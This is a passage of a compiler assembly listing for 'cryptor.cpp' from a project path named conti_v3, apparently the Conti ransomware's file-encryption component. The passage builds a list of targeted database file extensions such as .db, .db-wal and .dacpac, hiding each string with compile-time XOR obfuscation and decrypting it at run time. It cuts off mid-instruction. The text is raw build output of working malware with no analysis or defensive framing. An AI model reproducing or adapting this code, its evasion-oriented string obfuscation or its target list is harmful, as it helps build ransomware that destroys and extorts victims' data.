  005bb	c6 45 fa 40	 mov	 BYTE PTR $T16[rbp-246], 64 ; 00000040H
  005bf	0f b6 45 f1	 movzx	 eax, BYTE PTR $T16[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 309  : 		OBFW(L".ask"),

  005c3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  005c8	48 89 85 a8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-136], rax

; 310  : 		OBFW(L".btr"),

  005cf	48 8d 4d 00	 lea	 rcx, QWORD PTR $T17[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  005d3	c6 45 00 00	 mov	 BYTE PTR $T17[rbp-256], 0
  005d7	c6 45 01 17	 mov	 BYTE PTR $T17[rbp-255], 23
  005db	c6 45 02 03	 mov	 BYTE PTR $T17[rbp-254], 3
  005df	c6 45 03 12	 mov	 BYTE PTR $T17[rbp-253], 18
  005e3	c6 45 04 03	 mov	 BYTE PTR $T17[rbp-252], 3
  005e7	c6 45 05 46	 mov	 BYTE PTR $T17[rbp-251], 70 ; 00000046H
  005eb	c6 45 06 03	 mov	 BYTE PTR $T17[rbp-250], 3
  005ef	c6 45 07 24	 mov	 BYTE PTR $T17[rbp-249], 36 ; 00000024H
  005f3	c6 45 08 03	 mov	 BYTE PTR $T17[rbp-248], 3
  005f7	c6 45 09 03	 mov	 BYTE PTR $T17[rbp-247], 3
  005fb	c6 45 0a 03	 mov	 BYTE PTR $T17[rbp-246], 3
  005ff	0f b6 45 01	 movzx	 eax, BYTE PTR $T17[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 310  : 		OBFW(L".btr"),

  00603	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00608	48 89 85 b0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-128], rax

; 311  : 		OBFW(L".bdf"),

  0060f	48 8d 4d 10	 lea	 rcx, QWORD PTR $T18[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00613	c6 45 10 00	 mov	 BYTE PTR $T18[rbp-256], 0
  00617	c6 45 11 01	 mov	 BYTE PTR $T18[rbp-255], 1
  0061b	c6 45 12 36	 mov	 BYTE PTR $T18[rbp-254], 54 ; 00000036H
  0061f	c6 45 13 2e	 mov	 BYTE PTR $T18[rbp-253], 46 ; 0000002eH
  00623	c6 45 14 36	 mov	 BYTE PTR $T18[rbp-252], 54 ; 00000036H
  00627	c6 45 15 79	 mov	 BYTE PTR $T18[rbp-251], 121 ; 00000079H
  0062b	c6 45 16 36	 mov	 BYTE PTR $T18[rbp-250], 54 ; 00000036H
  0062f	c6 45 17 45	 mov	 BYTE PTR $T18[rbp-249], 69 ; 00000045H
  00633	c6 45 18 36	 mov	 BYTE PTR $T18[rbp-248], 54 ; 00000036H
  00637	c6 45 19 36	 mov	 BYTE PTR $T18[rbp-247], 54 ; 00000036H
  0063b	c6 45 1a 36	 mov	 BYTE PTR $T18[rbp-246], 54 ; 00000036H
  0063f	0f b6 45 11	 movzx	 eax, BYTE PTR $T18[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 311  : 		OBFW(L".bdf"),

  00643	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00648	48 89 85 b8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-120], rax

; 312  : 		OBFW(L".cat"),

  0064f	48 8d 4d 20	 lea	 rcx, QWORD PTR $T19[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00653	c6 45 20 00	 mov	 BYTE PTR $T19[rbp-256], 0
  00657	c6 45 21 73	 mov	 BYTE PTR $T19[rbp-255], 115 ; 00000073H
  0065b	c6 45 22 07	 mov	 BYTE PTR $T19[rbp-254], 7
  0065f	c6 45 23 02	 mov	 BYTE PTR $T19[rbp-253], 2
  00663	c6 45 24 07	 mov	 BYTE PTR $T19[rbp-252], 7
  00667	c6 45 25 2f	 mov	 BYTE PTR $T19[rbp-251], 47 ; 0000002fH
  0066b	c6 45 26 07	 mov	 BYTE PTR $T19[rbp-250], 7
  0066f	c6 45 27 40	 mov	 BYTE PTR $T19[rbp-249], 64 ; 00000040H
  00673	c6 45 28 07	 mov	 BYTE PTR $T19[rbp-248], 7
  00677	c6 45 29 07	 mov	 BYTE PTR $T19[rbp-247], 7
  0067b	c6 45 2a 07	 mov	 BYTE PTR $T19[rbp-246], 7
  0067f	0f b6 45 21	 movzx	 eax, BYTE PTR $T19[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 312  : 		OBFW(L".cat"),

  00683	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00688	48 89 85 c0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-112], rax

; 313  : 		OBFW(L".cdb"),

  0068f	48 8d 4d 30	 lea	 rcx, QWORD PTR $T20[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00693	c6 45 30 00	 mov	 BYTE PTR $T20[rbp-256], 0
  00697	c6 45 31 6c	 mov	 BYTE PTR $T20[rbp-255], 108 ; 0000006cH
  0069b	c6 45 32 1e	 mov	 BYTE PTR $T20[rbp-254], 30
  0069f	c6 45 33 68	 mov	 BYTE PTR $T20[rbp-253], 104 ; 00000068H
  006a3	c6 45 34 1e	 mov	 BYTE PTR $T20[rbp-252], 30
  006a7	c6 45 35 38	 mov	 BYTE PTR $T20[rbp-251], 56 ; 00000038H
  006ab	c6 45 36 1e	 mov	 BYTE PTR $T20[rbp-250], 30
  006af	c6 45 37 19	 mov	 BYTE PTR $T20[rbp-249], 25
  006b3	c6 45 38 1e	 mov	 BYTE PTR $T20[rbp-248], 30
  006b7	c6 45 39 1e	 mov	 BYTE PTR $T20[rbp-247], 30
  006bb	c6 45 3a 1e	 mov	 BYTE PTR $T20[rbp-246], 30
  006bf	0f b6 45 31	 movzx	 eax, BYTE PTR $T20[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 313  : 		OBFW(L".cdb"),

  006c3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  006c8	48 89 85 c8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-104], rax

; 314  : 		OBFW(L".ckp"),

  006cf	48 8d 4d 40	 lea	 rcx, QWORD PTR $T21[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  006d3	c6 45 40 00	 mov	 BYTE PTR $T21[rbp-256], 0
  006d7	c6 45 41 64	 mov	 BYTE PTR $T21[rbp-255], 100 ; 00000064H
  006db	c6 45 42 27	 mov	 BYTE PTR $T21[rbp-254], 39 ; 00000027H
  006df	c6 45 43 23	 mov	 BYTE PTR $T21[rbp-253], 35 ; 00000023H
  006e3	c6 45 44 27	 mov	 BYTE PTR $T21[rbp-252], 39 ; 00000027H
  006e7	c6 45 45 12	 mov	 BYTE PTR $T21[rbp-251], 18
  006eb	c6 45 46 27	 mov	 BYTE PTR $T21[rbp-250], 39 ; 00000027H
  006ef	c6 45 47 37	 mov	 BYTE PTR $T21[rbp-249], 55 ; 00000037H
  006f3	c6 45 48 27	 mov	 BYTE PTR $T21[rbp-248], 39 ; 00000027H
  006f7	c6 45 49 27	 mov	 BYTE PTR $T21[rbp-247], 39 ; 00000027H
  006fb	c6 45 4a 27	 mov	 BYTE PTR $T21[rbp-246], 39 ; 00000027H
  006ff	0f b6 45 41	 movzx	 eax, BYTE PTR $T21[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 314  : 		OBFW(L".ckp"),

  00703	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00708	48 89 85 d0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-96], rax

; 315  : 		OBFW(L".cma"),

  0070f	48 8d 4d 50	 lea	 rcx, QWORD PTR $T22[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00713	c6 45 50 00	 mov	 BYTE PTR $T22[rbp-256], 0
  00717	c6 45 51 2d	 mov	 BYTE PTR $T22[rbp-255], 45 ; 0000002dH
  0071b	c6 45 52 4c	 mov	 BYTE PTR $T22[rbp-254], 76 ; 0000004cH
  0071f	c6 45 53 01	 mov	 BYTE PTR $T22[rbp-253], 1
  00723	c6 45 54 4c	 mov	 BYTE PTR $T22[rbp-252], 76 ; 0000004cH
  00727	c6 45 55 37	 mov	 BYTE PTR $T22[rbp-251], 55 ; 00000037H
  0072b	c6 45 56 4c	 mov	 BYTE PTR $T22[rbp-250], 76 ; 0000004cH
  0072f	c6 45 57 29	 mov	 BYTE PTR $T22[rbp-249], 41 ; 00000029H
  00733	c6 45 58 4c	 mov	 BYTE PTR $T22[rbp-248], 76 ; 0000004cH
  00737	c6 45 59 4c	 mov	 BYTE PTR $T22[rbp-247], 76 ; 0000004cH
  0073b	c6 45 5a 4c	 mov	 BYTE PTR $T22[rbp-246], 76 ; 0000004cH
  0073f	0f b6 45 51	 movzx	 eax, BYTE PTR $T22[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 315  : 		OBFW(L".cma"),

  00743	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00748	48 89 85 d8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-88], rax

; 316  : 		OBFW(L".cpd"),

  0074f	48 8d 4d 60	 lea	 rcx, QWORD PTR $T23[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00753	c6 45 60 00	 mov	 BYTE PTR $T23[rbp-256], 0
  00757	c6 45 61 4a	 mov	 BYTE PTR $T23[rbp-255], 74 ; 0000004aH
  0075b	c6 45 62 39	 mov	 BYTE PTR $T23[rbp-254], 57 ; 00000039H
  0075f	c6 45 63 08	 mov	 BYTE PTR $T23[rbp-253], 8
  00763	c6 45 64 39	 mov	 BYTE PTR $T23[rbp-252], 57 ; 00000039H
  00767	c6 45 65 7e	 mov	 BYTE PTR $T23[rbp-251], 126 ; 0000007eH
  0076b	c6 45 66 39	 mov	 BYTE PTR $T23[rbp-250], 57 ; 00000039H
  0076f	c6 45 67 69	 mov	 BYTE PTR $T23[rbp-249], 105 ; 00000069H
  00773	c6 45 68 39	 mov	 BYTE PTR $T23[rbp-248], 57 ; 00000039H
  00777	c6 45 69 39	 mov	 BYTE PTR $T23[rbp-247], 57 ; 00000039H
  0077b	c6 45 6a 39	 mov	 BYTE PTR $T23[rbp-246], 57 ; 00000039H
  0077f	0f b6 45 61	 movzx	 eax, BYTE PTR $T23[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 316  : 		OBFW(L".cpd"),

  00783	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00788	48 89 85 e0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-80], rax

; 317  : 		OBFW(L".dacpac"),

  0078f	48 8d 8d 20 09
	00 00		 lea	 rcx, QWORD PTR $T24[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00796	c6 85 20 09 00
	00 00		 mov	 BYTE PTR $T24[rbp-256], 0
  0079d	c6 85 21 09 00
	00 61		 mov	 BYTE PTR $T24[rbp-255], 97 ; 00000061H
  007a4	c6 85 22 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-254], 24
  007ab	c6 85 23 09 00
	00 06		 mov	 BYTE PTR $T24[rbp-253], 6
  007b2	c6 85 24 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-252], 24
  007b9	c6 85 25 09 00
	00 04		 mov	 BYTE PTR $T24[rbp-251], 4
  007c0	c6 85 26 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-250], 24
  007c7	c6 85 27 09 00
	00 5a		 mov	 BYTE PTR $T24[rbp-249], 90 ; 0000005aH
  007ce	c6 85 28 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-248], 24
  007d5	c6 85 29 09 00
	00 0e		 mov	 BYTE PTR $T24[rbp-247], 14
  007dc	c6 85 2a 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-246], 24
  007e3	c6 85 2b 09 00
	00 04		 mov	 BYTE PTR $T24[rbp-245], 4
  007ea	c6 85 2c 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-244], 24
  007f1	c6 85 2d 09 00
	00 5a		 mov	 BYTE PTR $T24[rbp-243], 90 ; 0000005aH
  007f8	c6 85 2e 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-242], 24
  007ff	c6 85 2f 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-241], 24
  00806	c6 85 30 09 00
	00 18		 mov	 BYTE PTR $T24[rbp-240], 24
  0080d	0f b6 85 21 09
	00 00		 movzx	 eax, BYTE PTR $T24[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 317  : 		OBFW(L".dacpac"),

  00814	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  00819	48 89 85 e8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-72], rax

; 318  : 		OBFW(L".dad"),

  00820	48 8d 4d 70	 lea	 rcx, QWORD PTR $T25[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00824	c6 45 70 00	 mov	 BYTE PTR $T25[rbp-256], 0
  00828	c6 45 71 6f	 mov	 BYTE PTR $T25[rbp-255], 111 ; 0000006fH
  0082c	c6 45 72 13	 mov	 BYTE PTR $T25[rbp-254], 19
  00830	c6 45 73 5c	 mov	 BYTE PTR $T25[rbp-253], 92 ; 0000005cH
  00834	c6 45 74 13	 mov	 BYTE PTR $T25[rbp-252], 19
  00838	c6 45 75 56	 mov	 BYTE PTR $T25[rbp-251], 86 ; 00000056H
  0083c	c6 45 76 13	 mov	 BYTE PTR $T25[rbp-250], 19
  00840	c6 45 77 5c	 mov	 BYTE PTR $T25[rbp-249], 92 ; 0000005cH
  00844	c6 45 78 13	 mov	 BYTE PTR $T25[rbp-248], 19
  00848	c6 45 79 13	 mov	 BYTE PTR $T25[rbp-247], 19
  0084c	c6 45 7a 13	 mov	 BYTE PTR $T25[rbp-246], 19
  00850	0f b6 45 71	 movzx	 eax, BYTE PTR $T25[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 318  : 		OBFW(L".dad"),

  00854	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00859	48 89 85 f0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-64], rax

; 319  : 		OBFW(L".dadiagrams"),

  00860	48 8d 8d 10 0a
	00 00		 lea	 rcx, QWORD PTR $T26[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00867	c6 85 10 0a 00
	00 00		 mov	 BYTE PTR $T26[rbp-256], 0
  0086e	c6 85 11 0a 00
	00 15		 mov	 BYTE PTR $T26[rbp-255], 21
  00875	c6 85 12 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-254], 84 ; 00000054H
  0087c	c6 85 13 0a 00
	00 3f		 mov	 BYTE PTR $T26[rbp-253], 63 ; 0000003fH
  00883	c6 85 14 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-252], 84 ; 00000054H
  0088a	c6 85 15 0a 00
	00 67		 mov	 BYTE PTR $T26[rbp-251], 103 ; 00000067H
  00891	c6 85 16 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-250], 84 ; 00000054H
  00898	c6 85 17 0a 00
	00 3f		 mov	 BYTE PTR $T26[rbp-249], 63 ; 0000003fH
  0089f	c6 85 18 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-248], 84 ; 00000054H
  008a6	c6 85 19 0a 00
	00 51		 mov	 BYTE PTR $T26[rbp-247], 81 ; 00000051H
  008ad	c6 85 1a 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-246], 84 ; 00000054H
  008b4	c6 85 1b 0a 00
	00 67		 mov	 BYTE PTR $T26[rbp-245], 103 ; 00000067H
  008bb	c6 85 1c 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-244], 84 ; 00000054H
  008c2	c6 85 1d 0a 00
	00 17		 mov	 BYTE PTR $T26[rbp-243], 23
  008c9	c6 85 1e 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-242], 84 ; 00000054H
  008d0	c6 85 1f 0a 00
	00 58		 mov	 BYTE PTR $T26[rbp-241], 88 ; 00000058H
  008d7	c6 85 20 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-240], 84 ; 00000054H
  008de	c6 85 21 0a 00
	00 67		 mov	 BYTE PTR $T26[rbp-239], 103 ; 00000067H
  008e5	c6 85 22 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-238], 84 ; 00000054H
  008ec	c6 85 23 0a 00
	00 46		 mov	 BYTE PTR $T26[rbp-237], 70 ; 00000046H
  008f3	c6 85 24 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-236], 84 ; 00000054H
  008fa	c6 85 25 0a 00
	00 75		 mov	 BYTE PTR $T26[rbp-235], 117 ; 00000075H
  00901	c6 85 26 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-234], 84 ; 00000054H
  00908	c6 85 27 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-233], 84 ; 00000054H
  0090f	c6 85 28 0a 00
	00 54		 mov	 BYTE PTR $T26[rbp-232], 84 ; 00000054H
  00916	0f b6 85 11 0a
	00 00		 movzx	 eax, BYTE PTR $T26[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 319  : 		OBFW(L".dadiagrams"),

  0091d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
  00922	48 89 85 f8 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-56], rax

; 320  : 		OBFW(L".daschema"),

  00929	48 8d 8d c8 09
	00 00		 lea	 rcx, QWORD PTR $T27[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00930	c6 85 c8 09 00
	00 00		 mov	 BYTE PTR $T27[rbp-256], 0
  00937	c6 85 c9 09 00
	00 38		 mov	 BYTE PTR $T27[rbp-255], 56 ; 00000038H
  0093e	c6 85 ca 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-254], 9
  00945	c6 85 cb 09 00
	00 43		 mov	 BYTE PTR $T27[rbp-253], 67 ; 00000043H
  0094c	c6 85 cc 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-252], 9
  00953	c6 85 cd 09 00
	00 11		 mov	 BYTE PTR $T27[rbp-251], 17
  0095a	c6 85 ce 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-250], 9
  00961	c6 85 cf 09 00
	00 3f		 mov	 BYTE PTR $T27[rbp-249], 63 ; 0000003fH
  00968	c6 85 d0 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-248], 9
  0096f	c6 85 d1 09 00
	00 08		 mov	 BYTE PTR $T27[rbp-247], 8
  00976	c6 85 d2 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-246], 9
  0097d	c6 85 d3 09 00
	00 31		 mov	 BYTE PTR $T27[rbp-245], 49 ; 00000031H
  00984	c6 85 d4 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-244], 9
  0098b	c6 85 d5 09 00
	00 7e		 mov	 BYTE PTR $T27[rbp-243], 126 ; 0000007eH
  00992	c6 85 d6 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-242], 9
  00999	c6 85 d7 09 00
	00 5a		 mov	 BYTE PTR $T27[rbp-241], 90 ; 0000005aH
  009a0	c6 85 d8 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-240], 9
  009a7	c6 85 d9 09 00
	00 11		 mov	 BYTE PTR $T27[rbp-239], 17
  009ae	c6 85 da 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-238], 9
  009b5	c6 85 db 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-237], 9
  009bc	c6 85 dc 09 00
	00 09		 mov	 BYTE PTR $T27[rbp-236], 9
  009c3	0f b6 85 c9 09
	00 00		 movzx	 eax, BYTE PTR $T27[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 320  : 		OBFW(L".daschema"),

  009ca	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
  009cf	48 89 85 00 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-48], rax

; 321  : 		OBFW(L".db"),

  009d6	48 8d 4c 24 20	 lea	 rcx, QWORD PTR $T28[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  009db	c6 44 24 20 00	 mov	 BYTE PTR $T28[rsp], 0
  009e0	c6 44 24 21 71	 mov	 BYTE PTR $T28[rsp+1], 113 ; 00000071H
  009e5	c6 44 24 22 58	 mov	 BYTE PTR $T28[rsp+2], 88 ; 00000058H
  009ea	c6 44 24 23 36	 mov	 BYTE PTR $T28[rsp+3], 54 ; 00000036H
  009ef	c6 44 24 24 58	 mov	 BYTE PTR $T28[rsp+4], 88 ; 00000058H
  009f4	c6 44 24 25 4b	 mov	 BYTE PTR $T28[rsp+5], 75 ; 0000004bH
  009f9	c6 44 24 26 58	 mov	 BYTE PTR $T28[rsp+6], 88 ; 00000058H
  009fe	c6 44 24 27 58	 mov	 BYTE PTR $T28[rsp+7], 88 ; 00000058H
  00a03	c6 44 24 28 58	 mov	 BYTE PTR $T28[rsp+8], 88 ; 00000058H
  00a08	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T28[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 321  : 		OBFW(L".db"),

  00a0d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  00a12	48 89 85 08 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-40], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00a19	c6 85 38 09 00
	00 00		 mov	 BYTE PTR $T29[rbp-256], 0
  00a20	c6 85 39 09 00
	00 5c		 mov	 BYTE PTR $T29[rbp-255], 92 ; 0000005cH
  00a27	c6 85 3a 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-254], 111 ; 0000006fH
  00a2e	c6 85 3b 09 00
	00 14		 mov	 BYTE PTR $T29[rbp-253], 20
  00a35	c6 85 3c 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-252], 111 ; 0000006fH
  00a3c	c6 85 3d 09 00
	00 41		 mov	 BYTE PTR $T29[rbp-251], 65 ; 00000041H
  00a43	c6 85 3e 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-250], 111 ; 0000006fH
  00a4a	c6 85 3f 09 00
	00 33		 mov	 BYTE PTR $T29[rbp-249], 51 ; 00000033H
  00a51	c6 85 40 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-248], 111 ; 0000006fH
  00a58	c6 85 41 09 00
	00 00		 mov	 BYTE PTR $T29[rbp-247], 0
  00a5f	c6 85 42 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-246], 111 ; 0000006fH
  00a66	c6 85 43 09 00
	00 39		 mov	 BYTE PTR $T29[rbp-245], 57 ; 00000039H
  00a6d	c6 85 44 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-244], 111 ; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00a74	c6 85 45 09 00
	00 08		 mov	 BYTE PTR $T29[rbp-243], 8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 322  : 		OBFW(L".db-shm"),

  00a7b	48 8d 8d 38 09
	00 00		 lea	 rcx, QWORD PTR $T29[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00a82	c6 85 46 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-242], 111 ; 0000006fH
  00a89	c6 85 47 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-241], 111 ; 0000006fH
  00a90	c6 85 48 09 00
	00 6f		 mov	 BYTE PTR $T29[rbp-240], 111 ; 0000006fH
  00a97	0f b6 85 39 09
	00 00		 movzx	 eax, BYTE PTR $T29[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 322  : 		OBFW(L".db-shm"),

  00a9e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  00aa3	48 89 85 10 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-32], rax

; 323  : 		OBFW(L".db-wal"),

  00aaa	48 8d 8d 50 09
	00 00		 lea	 rcx, QWORD PTR $T30[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00ab1	c6 85 50 09 00
	00 00		 mov	 BYTE PTR $T30[rbp-256], 0
  00ab8	c6 85 51 09 00
	00 04		 mov	 BYTE PTR $T30[rbp-255], 4
  00abf	c6 85 52 09 00
